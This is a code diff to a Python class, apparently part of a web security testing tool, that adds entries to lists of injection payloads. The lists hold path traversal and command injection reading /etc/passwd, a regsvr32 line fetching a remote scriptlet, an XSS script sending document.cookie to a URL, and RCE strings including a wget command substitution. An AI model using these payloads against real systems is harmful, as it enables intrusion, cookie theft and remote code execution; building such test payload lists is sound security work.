@@ -9,7 +9,7 @@ class Injections():
     def command_injections():
         command_injections = ['../../etc/passwd', '; cat /etc/passwd',
             '<!--#exec cmd="ls ../"-->',"|| regsvr32 /s /n /u /\
-            i:http://192.168.1.103:8080/C99PdFH.sct scrobj.dll"]
+            i:http://192.168.1.103:8080/C99PdFH.sct scrobj.dll, '|ls -la|'"]
 
         return command_injections
 
@@ -21,12 +21,13 @@ class Injections():
         </script>", "<script>/* */var i=new Image();/* */i.src=\
         'http://localhost:3000/search?utf8=%E2%9C%93&query='+document.cookie+'\
         &commit=Go'/**/</script>","<<SCRIPT>alert('HackThis!!');//<</SCRIPT>",
-        ""]
+        "<a href='evilsite.com'>Click Me!</a>"]
 
         return xss_injections
 
     def rce_injections():
-        rce_injections = ["http://evilsite.com/evilcode.php", "; system('id')"]
+        rce_injections = ["http://evilsite.com/evilcode.php", "; system('id')",
+        "$(`wget www.google.com`)"]
 
         return rce_injections
 
